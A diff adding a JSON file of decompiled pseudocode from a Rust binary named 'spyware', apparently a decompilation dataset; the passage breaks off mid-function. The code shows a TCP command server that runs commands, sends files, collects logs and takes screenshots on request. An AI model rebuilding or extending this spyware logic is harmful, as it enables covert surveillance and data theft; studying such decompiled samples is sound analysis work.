@@ -1,0 +1,4562 @@
+{
+  "decompilation": {
+    "_ZN7spyware13communication6server13send_response17h17eae7eef2507d79E": "__int64 __fastcall spyware::communication::server::send_response(__int64 a1, __int64 a2)\n{\n  __int64 v2; // rdx\n  __int64 v3; // rbx\n  _QWORD *v4; // r14\n  __int64 v5; // rax\n  __int64 v7; // [rsp+8h] [rbp-A0h] BYREF\n  __int64 v8; // [rsp+10h] [rbp-98h]\n  _QWORD *v9; // [rsp+18h] [rbp-90h]\n  __int64 v10; // [rsp+20h] [rbp-88h] BYREF\n  __int64 *v11; // [rsp+28h] [rbp-80h] BYREF\n  __int64 v12; // [rsp+30h] [rbp-78h] BYREF\n  __int64 v13; // [rsp+38h] [rbp-70h]\n  _QWORD *v14; // [rsp+40h] [rbp-68h]\n  __int64 v15; // [rsp+48h] [rbp-60h]\n  __int64 v16; // [rsp+50h] [rbp-58h]\n  _QWORD v17[2]; // [rsp+60h] [rbp-48h] BYREF\n  _QWORD v18[7]; // [rsp+70h] [rbp-38h] BYREF\n\n  v10 = a2;\n  spyware::communication::serialization::serialize_message(&v12, a1);\n  v3 = v13;\n  if ( !__OFSUB__(-v12, 1LL) )\n  {\n    v4 = v14;\n    v7 = v12;\n    v8 = v13;\n    v9 = v14;\n    if ( (unsigned __int64)core::sync::atomic::atomic_load(&v12, a1, v2, -v12) >= 4 )\n    {\n      v11 = &v7;\n      v17[0] = &v11;\n      v17[1] = <&T as core::fmt::Debug>::fmt;\n      v12 = (__int64)&off_B8AE8;\n      v13 = 1LL;\n      v16 = 0LL;\n      v14 = v17;\n      v15 = 1LL;\n      v5 = log::__private_api::loc(&off_B8AF8);\n      v18[0] = aSpywareCommuni;\n      v18[1] = 30LL;\n      v18[2] = aSpywareCommuni;\n      v18[3] = 30LL;\n      v18[4] = v5;\n      log::__private_api::log(&v12, 4LL, v18);\n      v3 = v8;\n      v4 = v9;\n    }\n    v3 = std::io::Write::write_all(&v10, v3, v4);\n    core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v7);\n    if ( !v3 )\n      return 0LL;\n  }\n  return v3;\n}",
+    "_ZN7spyware13communication6server14handle_message17h02435bd595e8370dE": "__int64 __fastcall spyware::communication::server::handle_message(\n        __int64 a1,\n        char **a2,\n        __int64 a3,\n        __int64 a4,\n        __int64 a5,\n        __int64 a6)\n{\n  __int128 v6; // xmm0\n  __int64 v7; // rax\n  __int64 result; // rax\n  __int64 v9; // rdx\n  __int64 v10; // rcx\n  __int64 v11; // r8\n  __int64 v12; // r9\n  char v13; // bp\n  unsigned __int64 v14; // r15\n  __int64 v15; // rax\n  __int64 v16; // rax\n  __int64 v17; // rax\n  char **v18; // [rsp+0h] [rbp-338h] BYREF\n  __int64 v19; // [rsp+8h] [rbp-330h]\n  __int64 v20; // [rsp+10h] [rbp-328h]\n  __int128 v21; // [rsp+18h] [rbp-320h]\n  _QWORD v22[5]; // [rsp+38h] [rbp-300h] BYREF\n  __int128 v23; // [rsp+60h] [rbp-2D8h] BYREF\n  __int64 v24; // [rsp+70h] [rbp-2C8h]\n  _OWORD v25[2]; // [rsp+80h] [rbp-2B8h] BYREF\n  unsigned __int64 v26; // [rsp+A0h] [rbp-298h] BYREF\n  __int128 v27; // [rsp+A8h] [rbp-290h]\n  __int128 v28; // [rsp+B8h] [rbp-280h]\n  __int128 v29; // [rsp+C8h] [rbp-270h]\n  __int64 v30; // [rsp+D8h] [rbp-260h]\n  unsigned __int64 v31; // [rsp+E0h] [rbp-258h] BYREF\n  __int128 v32; // [rsp+E8h] [rbp-250h]\n  __int128 v33; // [rsp+F8h] [rbp-240h]\n  __int128 v34; // [rsp+108h] [rbp-230h]\n  __int64 v35; // [rsp+118h] [rbp-220h]\n  unsigned __int64 v36; // [rsp+120h] [rbp-218h] BYREF\n  __int128 v37; // [rsp+128h] [rbp-210h]\n  __int128 v38; // [rsp+138h] [rbp-200h]\n  __int128 v39; // [rsp+148h] [rbp-1F0h]\n  __int64 v40; // [rsp+158h] [rbp-1E0h]\n  unsigned __int64 v41; // [rsp+160h] [rbp-1D8h] BYREF\n  __int128 v42; // [rsp+168h] [rbp-1D0h]\n  __int128 v43; // [rsp+178h] [rbp-1C0h]\n  __int128 v44; // [rsp+188h] [rbp-1B0h]\n  __int64 v45; // [rsp+198h] [rbp-1A0h]\n  _OWORD v46[3]; // [rsp+1A0h] [rbp-198h] BYREF\n  __int64 v47; // [rsp+1D0h] [rbp-168h]\n  _OWORD v48[3]; // [rsp+1D8h] [rbp-160h] BYREF\n  __int64 v49; // [rsp+208h] [rbp-130h]\n  _OWORD v50[3]; // [rsp+210h] [rbp-128h] BYREF\n  __int64 v51; // [rsp+240h] [rbp-F8h]\n  _OWORD v52[3]; // [rsp+248h] [rbp-F0h] BYREF\n  __int64 v53; // [rsp+278h] [rbp-C0h]\n  _OWORD v54[4]; // [rsp+280h] [rbp-B8h] BYREF\n  _OWORD v55[7]; // [rsp+2C8h] [rbp-70h] BYREF\n\n  switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )\n  {\n    case 0uLL:\n      v6 = *(_OWORD *)(a1 + 8);\n      v25[1] = *(_OWORD *)(a1 + 24);\n      v25[0] = v6;\n      spyware::actions::commands::run_command_message(v46, v25);\n      v30 = v47;\n      v29 = v46[2];\n      v28 = v46[1];\n      v27 = v46[0];\n      v26 = 0x8000000000000001LL;\n      v7 = spyware::communication::server::send_response((__int64)&v26, (__int64)a2);\n      a2 = &off_B8B20;\n      result = core::result::Result<T,E>::unwrap(v7, &off_B8B20);\n      switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )\n      {\n        case 0uLL:\n        case 6uLL:\n        case 8uLL:\n          return result;\n        case 2uLL:\n        case 4uLL:\n          goto LABEL_17;\n        default:\n          return core::ptr::drop_in_place<spyware::communication::messages::Message>(\n                   a1,\n                   a2,\n                   v9,\n                   v10,\n                   v11,\n                   v12,\n                   v18,\n                   v19,\n                   v20,\n                   v21,\n                   *((_QWORD *)&v21 + 1));\n      }\n      return result;\n    case 2uLL:\n      v24 = *(_QWORD *)(a1 + 24);\n      v23 = *(_OWORD *)(a1 + 8);\n      spyware::actions::basic_info::download_file_message(v48, &v23);\n      v35 = v49;\n      v34 = v48[2];\n      v33 = v48[1];\n      v32 = v48[0];\n      v31 = 0x8000000000000003LL;\n      v16 = spyware::communication::server::send_response((__int64)&v31, (__int64)a2);\n      a2 = &off_B8B38;\n      result = core::result::Result<T,E>::unwrap(v16, &off_B8B38);\n      switch ( *(_QWORD *)a1 ^ 0x8000000000000000LL )\n      {\n        case 0uLL:\n          return core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>(\n                   a1 + 8,\n                   a2,\n                   v9,\n                   v10,\n                   v11,\n                   v12,\n                   v18,\n                   v19,\n                   v20,\n                   v21,\n                   *((_QWORD *)&v21 + 1));\n        case 2uLL:\n        case 6uLL:\n        case 8uLL:\n          return result;\n        case 4uLL:\n          goto LABEL_17;\n        default:\n          return core::ptr::drop_in_place<spyware::communication::messages::Message>(\n                   a1,\n                   a2,\n                   v9,\n                   v10,\n                   v11,\n                   v12,\n                   v18,\n                   v19,\n                   v20,\n                   v21,\n                   *((_QWORD *)&v21 + 1));\n      }\n      return result;\n    case 4uLL:\n      spyware::actions::basic_info::get_basic_info_request(\n        v55,\n        a2,\n        a3,\n        a4,\n        a5,\n        a6,\n        *(_QWORD *)(a1 + 8),\n        *(_QWORD *)(a1 + 16),\n        *(_QWORD *)(a1 + 24));\n      v54[3] = v55[3];\n      v54[2] = v55[2];\n      v54[1] = v55[1];\n      v54[0] = v55[0];\n      v15 = spyware::communication::server::send_response((__int64)v54, (__int64)a2);\n      a2 = &off_B8B50;\n      core::result::Result<T,E>::unwrap(v15, &off_B8B50);\n      result = core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(&v18);\n      v13 = 0;\n      v14 = *(_QWORD *)a1 ^ 0x8000000000000000LL;\n      if ( v14 <= 8 )\n        goto LABEL_13;\n      return core::ptr::drop_in_place<spyware::communication::messages::Message>(\n               a1,\n               a2,\n               v9,\n               v10,\n               v11,\n               v12,\n               v18,\n               v19,\n               v20,\n               v21,\n               *((_QWORD *)&v21 + 1));\n    case 6uLL:\n      spyware::actions::log_actions::get_logs_request(v50);\n      v40 = v51;\n      v39 = v50[2];\n      v38 = v50[1];\n      v37 = v50[0];\n      v36 = 0x8000000000000007LL;\n      v17 = spyware::communication::server::send_response((__int64)&v36, (__int64)a2);\n      a2 = &off_B8B68;\n      goto LABEL_12;\n    case 8uLL:\n      spyware::actions::screenshot_actions::get_screenshot_request(v52);\n      v45 = v53;\n      v44 = v52[2];\n      v43 = v52[1];\n      v42 = v52[0];\n      v41 = 0x8000000000000009LL;\n      v17 = spyware::communication::server::send_response((__int64)&v41, (__int64)a2);\n      a2 = &off_B8B80;\nLABEL_12:\n      v13 = 1;\n      result = core::result::Result<T,E>::unwrap(v17, a2);\n      v14 = *(_QWORD *)a1 ^ 0x8000000000000000LL;\n      goto LABEL_13;\n    default:\n      result = core::sync::atomic::atomic_load(a1, a2, a3, a4);\n      if ( result )\n      {\n        v18 = &off_B8B10;\n        v19 = 1LL;\n        v20 = 8LL;\n        v21 = 0LL;\n        v22[0] = aSpywareCommuni;\n        v22[1] = 30LL;\n        v22[2] = aSpywareCommuni;\n        v22[3] = 30LL;\n        v22[4] = log::__private_api::loc(&off_B8B98);\n        a2 = (char **)(&dword_0 + 1);\n        result = log::__private_api::log(&v18, 1LL, v22);\n      }\n      v13 = 1;\n      v14 = *(_QWORD *)a1 ^ 0x8000000000000000LL;\n      if ( v14 > 8 )\n        return core::ptr::drop_in_place<spyware::communication::messages::Message>(\n                 a1,\n                 a2,\n                 v9,\n                 v10,\n                 v11,\n                 v12,\n                 v18,\n                 v19,\n                 v20,\n                 v21,\n                 *((_QWORD *)&v21 + 1));\nLABEL_13:\n      switch ( v14 )\n      {\n        case 0uLL:\n          return core::ptr::drop_in_place<spyware::communication::messages::ErrorInfo>(\n                   a1 + 8,\n                   a2,\n                   v9,\n                   v10,\n                   v11,\n                   v12,\n                   v18,\n                   v19,\n                   v20,\n                   v21,\n                   *((_QWORD *)&v21 + 1));\n        case 2uLL:\n          goto LABEL_17;\n        case 4uLL:\n          if ( v13 )\nLABEL_17:\n            result = core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(a1 + 8);\n          break;\n        case 6uLL:\n        case 8uLL:\n          return result;\n        default:\n          return core::ptr::drop_in_place<spyware::communication::messages::Message>(\n                   a1,\n                   a2,\n                   v9,\n                   v10,\n                   v11,\n                   v12,\n                   v18,\n                   v19,\n                   v20,\n                   v21,\n                   *((_QWORD *)&v21 + 1));\n      }\n      return result;\n  }\n}",
+    "_ZN7spyware13communication6server11get_message17hbc00a55f19d841bbE": "__int64 __fastcall spyware::communication::server::get_message(__int64 a1, __int64 a2)\n{\n  __int64 v2; // rax\n  __int64 v3; // rdx\n  __int64 v4; // rcx\n  __int64 v5; // rax\n  __int64 msg_type_and_length; // rax\n  __int64 v7; // rax\n  __int128 v8; // xmm0\n  __int128 v9; // xmm1\n  __int128 v10; // xmm2\n  __int64 result; // rax\n  __int64 v12; // rax\n  unsigned int v13; // [rsp+4h] [rbp-114h] BYREF\n  __int64 v14; // [rsp+8h] [rbp-110h] BYREF\n  __int64 v15; // [rsp+10h] [rbp-108h] BYREF\n  const char *v16; // [rsp+18h] [rbp-100h] BYREF\n  __int64 v17; // [rsp+20h] [rbp-F8h]\n  __int128 v18; // [rsp+28h] [rbp-F0h]\n  __int64 v19; // [rsp+38h] [rbp-E0h]\n  _QWORD v20[2]; // [rsp+40h] [rbp-D8h] BYREF\n  __int128 v21; // [rsp+50h] [rbp-C8h]\n  _QWORD v22[4]; // [rsp+60h] [rbp-B8h] BYREF\n  _QWORD v23[8]; // [rsp+80h] [rbp-98h] BYREF\n  _OWORD v24[5]; // [rsp+C0h] [rbp-58h] BYREF\n\n  v14 = a2;\n  v13 = 0;\n  v2 = std::io::default_read_exact(&v14, &v13, 4LL);\n  if ( !v2 )\n  {\n    msg_type_and_length = spyware::communication::serialization::extract_msg_type_and_length(v13);\n    <u8 as alloc::vec::spec_from_elem::SpecFromElem>::from_elem(&v16, msg_type_and_length);\n    v7 = std::io::default_read_exact(&v14, v17, v18);\n    core::result::Result<T,E>::expect(v7);\n    ron::de::from_bytes(v23, v17, v18);\n    core::result::Result<T,E>::unwrap(v24, v23);\n    v8 = v24[0];\n    v9 = v24[1];\n    v10 = v24[2];\n    *(_OWORD *)(a1 + 48) = v24[3];\n    *(_OWORD *)(a1 + 32) = v10;\n    *(_OWORD *)(a1 + 16) = v9;\n    *(_OWORD *)a1 = v8;\n    return core::ptr::drop_in_place<alloc::vec::Vec<u8>>(&v16);\n  }\n  v15 = v2;\n  if ( core::sync::atomic::atomic_load(&v14, &v13, v3, v4) )\n  {\n    std::net::tcp::TcpStream::peer_addr(&v16, v14);\n    if ( (_WORD)v16 == 2 )\n    {\n      v5 = v17;\nLABEL_8:\n      *(_QWORD *)(a1 + 8) = v5;\n      *(_QWORD *)a1 = 0x800000000000000ALL;\n      return core::ptr::drop_in_place<std::io::error::Error>(&v15);\n    }\n    v20[0] = v16;\n    v24[4] = v18;\n    v20[1] = v17;\n    v21 = v18;\n    v22[0] = v20;\n    v22[1] = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;\n    v22[2] = &v15;\n    v22[3] = <std::io::error::Error as core::fmt::Display>::fmt;\n    v23[0] = &off_B8BB0;\n    v23[1] = 2LL;\n    v23[4] = 0LL;\n    v23[2] = v22;\n    v23[3] = 2LL;\n    v12 = log::__private_api::loc(&off_B8C18);\n    v16 = aSpywareCommuni;\n    v17 = 30LL;\n    *(_QWORD *)&v18 = aSpywareCommuni;\n    *((_QWORD *)&v18 + 1) = 30LL;\n    v19 = v12;\n    log::__private_api::log(v23, 1LL, &v16);\n  }\n  v5 = std::net::tcp::TcpStream::shutdown(v14, 2LL);\n  if ( v5 )\n    goto LABEL_8;\n  *(_QWORD *)(a1 + 8) = v15;\n  result = 0x800000000000000ALL;\n  *(_QWORD *)a1 = 0x800000000000000ALL;\n  return result;\n}",
+    "_ZN7spyware13communication6server13handle_client17hb99b66a85b0a9c88E": "__int64 __fastcall spyware::communication::server::handle_client(__int64 a1, __int64 a2, __int64 a3, __int64 a4)\n{\n  __int64 v4; // rbx\n  __int64 v5; // rax\n  __int64 v6; // rdx\n  __int64 v7; // rcx\n  __int64 v8; // r8\n  __int64 v9; // r9\n  __int64 v10; // rdx\n  __int64 v11; // rcx\n  __int64 v12; // rax\n  unsigned int v14; // [rsp+4h] [rbp-F4h] BYREF\n  __int64 v15; // [rsp+8h] [rbp-F0h] BYREF\n  __int128 v16; // [rsp+10h] [rbp-E8h] BYREF\n  __m256i v17; // [rsp+20h] [rbp-D8h]\n  __int128 v18; // [rsp+40h] [rbp-B8h]\n  __int128 v19; // [rsp+50h] [rbp-A8h] BYREF\n  __m256i v20; // [rsp+60h] [rbp-98h]\n  __int128 v21; // [rsp+80h] [rbp-78h]\n  __int64 *v22; // [rsp+90h] [rbp-68h] BYREF\n  __int64 (__fastcall *v23)(); // [rsp+98h] [rbp-60h]\n  __int128 v24; // [rsp+A0h] [rbp-58h] BYREF\n  __m256i v25; // [rsp+B0h] [rbp-48h]\n  __int128 v26; // [rsp+D0h] [rbp-28h]\n  __int128 v27; // [rsp+E0h] [rbp-18h]\n\n  v14 = a1;\n  if ( (unsigned __int64)core::sync::atomic::atomic_load(a1, a2, a3, a4) >= 4 )\n  {\n    std::net::tcp::TcpStream::peer_addr(&v16, &v14);\n    if ( (_WORD)v16 == 2 )\n    {\n      v4 = *((_QWORD *)&v16 + 1);\n      goto LABEL_9;\n    }\n    v24 = v16;\n    v27 = *(_OWORD *)v17.m256i_i8;\n    *(_OWORD *)v25.m256i_i8 = *(_OWORD *)v17.m256i_i8;\n    v22 = (__int64 *)&v24;\n    v23 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;\n    *(_QWORD *)&v19 = &off_B8C30;\n    *((_QWORD *)&v19 + 1) = 1LL;\n    v20.m256i_i64[0] = (__int64)&v22;\n    *(_OWORD *)&v20.m256i_u64[1] = 1uLL;\n    v5 = log::__private_api::loc(&off_B8C70);\n    *(_QWORD *)&v16 = aSpywareCommuni;\n    *((_QWORD *)&v16 + 1) = 30LL;\n    v17.m256i_i64[0] = (__int64)aSpywareCommuni;\n    v17.m256i_i64[1] = 30LL;\n    v17.m256i_i64[2] = v5;\n    log::__private_api::log(&v19, 4LL, &v16);\n  }\n  while ( 1 )\n  {\n    spyware::communication::server::get_message((__int64)&v24, (__int64)&v14);\n    if ( (_QWORD)v24 == 0x800000000000000ALL )\n      break;\n    v18 = v26;\n    v17 = v25;\n    v16 = v24;\n    *(_QWORD *)&v19 = &off_B8C50;\n    *((_QWORD *)&v19 + 1) = 1LL;\n    v20.m256i_i64[0] = 8LL;\n    *(_OWORD *)&v20.m256i_u64[1] = 0LL;\n    std::io::stdio::_print(&v19);\n    v21 = v18;\n    v20 = v17;\n    v19 = v16;\n    spyware::communication::server::handle_message((__int64)&v19, (char **)&v14, v6, v7, v8, v9);\n  }\n  v4 = *((_QWORD *)&v24 + 1);\n  v15 = *((_QWORD *)&v24 + 1);\n  *(_QWORD *)&v19 = &off_B8C40;\n  *((_QWORD *)&v19 + 1) = 1LL;\n  v20.m256i_i64[0] = 8LL;\n  *(_OWORD *)&v20.m256i_u64[1] = 0LL;\n  std::io::stdio::_print(&v19);\n  if ( core::sync::atomic::atomic_load(&v19, &v14, v10, v11) )\n  {\n    v22 = &v15;\n    v23 = <std::io::error::Error as core::fmt::Display>::fmt;\n    *(_QWORD *)&v19 = &off_B8C60;\n    *((_QWORD *)&v19 + 1) = 1LL;\n    v20.m256i_i64[0] = (__int64)&v22;\n    *(_OWORD *)&v20.m256i_u64[1] = 1uLL;\n    v12 = log::__private_api::loc(&off_B8C88);\n    *(_QWORD *)&v16 = aSpywareCommuni;\n    *((_QWORD *)&v16 + 1) = 30LL;\n    v17.m256i_i64[0] = (__int64)aSpywareCommuni;\n    v17.m256i_i64[1] = 30LL;\n    v17.m256i_i64[2] = v12;\n    log::__private_api::log(&v19, 1LL, &v16);\n    v4 = v15;\n  }\nLABEL_9:\n  core::ptr::drop_in_place<std::net::tcp::TcpStream>(v14);\n  return v4;\n}",
+    "_ZN7spyware13communication6server10run_server17hf575f6adb91dbfb6E": "__int64 __fastcall spyware::communication::server::run_server(__int16 a1)\n{\n  __int64 v1; // rbx\n  __int64 v2; // rdx\n  __int64 v3; // rcx\n  __int64 v4; // rax\n  __int64 v5; // rax\n  __int64 v6; // rdx\n  __int64 v7; // rcx\n  __int64 v8; // rax\n  __int64 v9; // rax\n  unsigned int v11; // [rsp+4h] [rbp-114h] BYREF\n  unsigned int v12; // [rsp+8h] [rbp-110h] BYREF\n  __int16 v13; // [rsp+Eh] [rbp-10Ah] BYREF\n  __int128 v14; // [rsp+10h] [rbp-108h] BYREF\n  __int128 v15; // [rsp+20h] [rbp-F8h]\n  __int64 v16; // [rsp+30h] [rbp-E8h]\n  unsigned int *v17; // [rsp+38h] [rbp-E0h] BYREF\n  char **v18; // [rsp+40h] [rbp-D8h] BYREF\n  __int64 v19; // [rsp+48h] [rbp-D0h]\n  __int128 *v20; // [rsp+50h] [rbp-C8h]\n  __int64 v21; // [rsp+58h] [rbp-C0h]\n  __int64 v22; // [rsp+60h] [rbp-B8h]\n  char v23; // [rsp+68h] [rbp-B0h]\n  __int128 *v24; // [rsp+70h] [rbp-A8h] BYREF\n  __int64 (__fastcall *v25)(); // [rsp+78h] [rbp-A0h]\n  __int128 v26; // [rsp+80h] [rbp-98h] BYREF\n  __int128 v27; // [rsp+90h] [rbp-88h]\n  _OWORD v28[3]; // [rsp+A0h] [rbp-78h] BYREF\n  _BYTE v29[72]; // [rsp+D0h] [rbp-48h] BYREF\n\n  v13 = a1;\n  *(_QWORD *)&v14 = &off_B8D10;\n  *((_QWORD *)&v14 + 1) = <&T as core::fmt::Display>::fmt;\n  *(_QWORD *)&v15 = &v13;\n  *((_QWORD *)&v15 + 1) = core::fmt::num::imp::<impl core::fmt::Display for u16>::fmt;\n  v18 = (char **)&unk_B8CA0;\n  v19 = 2LL;\n  v22 = 0LL;\n  v20 = &v14;\n  v21 = 2LL;\n  core::option::Option<T>::map_or_else(v29, &v18);\n  std::net::tcp::TcpListener::bind(&v18, v29);\n  if ( ((unsigned __int8)v18 & 1) == 0 )\n  {\n    v12 = HIDWORD(v18);\n    std::net::udp::UdpSocket::local_addr(v28, &v12);\n    if ( LOWORD(v28[0]) == 2 )\n    {\n      v17 = (unsigned int *)*((_QWORD *)&v28[0] + 1);\n      if ( core::sync::atomic::atomic_load(v28, &v12, v2, v3) )\n      {\n        v24 = (__int128 *)&v17;\n        *(_QWORD *)&v26 = &v24;\n        *((_QWORD *)&v26 + 1) = <&T as core::fmt::Display>::fmt;\n        v18 = &off_B8CD0;\n        v19 = 2LL;\n        v22 = 0LL;\n        v20 = &v26;\n        v21 = 1LL;\n        v4 = log::__private_api::loc(&off_B8D38);\n        *(_QWORD *)&v14 = aSpywareCommuni;\n        *((_QWORD *)&v14 + 1) = 30LL;\n        *(_QWORD *)&v15 = aSpywareCommuni;\n        *((_QWORD *)&v15 + 1) = 30LL;\n        v16 = v4;\n        log::__private_api::log(&v18, 1LL, &v14);\n      }\n      core::ptr::drop_in_place<std::io::error::Error>(&v17);\n    }\n    else\n    {\n      v27 = v28[1];\n      v26 = v28[0];\n      if ( (unsigned __int64)core::sync::atomic::atomic_load(v28, &v12, v2, v3) >= 3 )\n      {\n        v24 = &v26;\n        v25 = <core::net::socket_addr::SocketAddr as core::fmt::Debug>::fmt;\n        v18 = &off_B8CC0;\n        v19 = 1LL;\n        v22 = 0LL;\n        v20 = (__int128 *)&v24;\n        v21 = 1LL;\n        v5 = log::__private_api::loc(&off_B8D20);\n        *(_QWORD *)&v14 = aSpywareCommuni;\n        *((_QWORD *)&v14 + 1) = 30LL;\n        *(_QWORD *)&v15 = aSpywareCommuni;\n        *((_QWORD *)&v15 + 1) = 30LL;\n        v16 = v5;\n        log::__private_api::log(&v18, 3LL, &v14);\n      }\n    }\n    v17 = &v12;\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        <std::net::tcp::Incoming as core::iter::traits::iterator::Iterator>::next(&v24, &v17);\n        if ( !(_DWORD)v24 )\n          break;\n        if ( (_DWORD)v24 != 1 )\n          std::panicking::begin_panic(aServerClosedUn, 26LL, &off_B8D50);\n        *(_QWORD *)&v28[0] = v25;\n        if ( core::sync::atomic::atomic_load(&v24, &v17, v6, v7) )\n        {\n          *(_QWORD *)&v26 = v28;\n          *((_QWORD *)&v26 + 1) = <std::io::error::Error as core::fmt::Display>::fmt;\n          v18 = &off_B8D00;\n          v19 = 1LL;\n          v22 = 0LL;\n          v20 = &v26;\n          v21 = 1LL;\n          v8 = log::__private_api::loc(&off_B8D98);\n          *(_QWORD *)&v14 = aSpywareCommuni;\n          *((_QWORD *)&v14 + 1) = 30LL;\n          *(_QWORD *)&v15 = aSpywareCommuni;\n          *((_QWORD *)&v15 + 1) = 30LL;\n          v16 = v8;\n          log::__private_api::log(&v18, 1LL, &v14);\n        }\n        core::ptr::drop_in_place<std::io::error::Error>(v28);\n      }\n      v11 = HIDWORD(v24);\n      if ( (unsigned __int64)core::sync::atomic::atomic_load(&v24, &v17, v6, v7) >= 3 )\n      {\n        std::net::tcp::TcpStream::peer_addr(&v14, &v11);\n        if ( (_WORD)v14 == 2 )\n        {\n          v1 = *((_QWORD *)&v14 + 1);\n          core::ptr::drop_in_place<std::net::tcp::TcpStream>(v11);\n          core::ptr::drop_in_place<std::net::tcp::TcpStream>(v12);\n          return v1;\n        }\n        v26 = v14;\n        v28[2] = v15;\n        v27 = v15;\n        *(_QWORD *)&v28[0] = &v26;\n        *((_QWORD *)&v28[0] + 1) = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;\n        v18 = &off_B8CF0;\n        v19 = 1LL;\n        v22 = 0LL;\n        v20 = v28;\n        v21 = 1LL;\n        v9 = log::__private_api::loc(&off_B8D68);\n        *(_QWORD *)&v14 = aSpywareCommuni;\n        *((_QWORD *)&v14 + 1) = 30LL;\n        *(_QWORD *)&v15 = aSpywareCommuni;\n        *((_QWORD *)&v15 + 1) = 30LL;\n        v16 = v9;\n        log::__private_api::log(&v18, 3LL, &v14);\n      }\n      v20 = (__int128 *)0x8000000000000000LL;\n      v18 = 0LL;\n      v23 = 0;\n      std::thread::Builder::spawn_unchecked(&v14, &v18, v11);\n      core::result::Result<T,E>::expect(&v18, &v14);\n      core::ptr::drop_in_place<std::thread::JoinHandle<core::result::Result<(),std::io::error::Error>>>(&v18);\n    }\n  }\n  return v19;\n}",
+    "_ZN7spyware13communication8messages1_95_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$9serialize17h8c3fceac6ed6801fE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::ErrorInfo>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aErrorinfo, 9LL, 2LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aRawOsError_0, 12LL, a2 + 24);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aAsString_0, 9LL, a2),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_96_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..ErrorInfo$GT$11deserialize17h16e2a26e495d2d09E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::ErrorInfo>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(a1, a2, aErrorinfo, 9LL, &off_B8E80, 2LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$9serialize17h05e636ca783c8b29E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::RunCommandRequest>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aRuncommandrequ, 17LL, 2LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aCommand_0, 7LL, a2);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aAsyncRun_0, 9LL, a2 + 24),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = 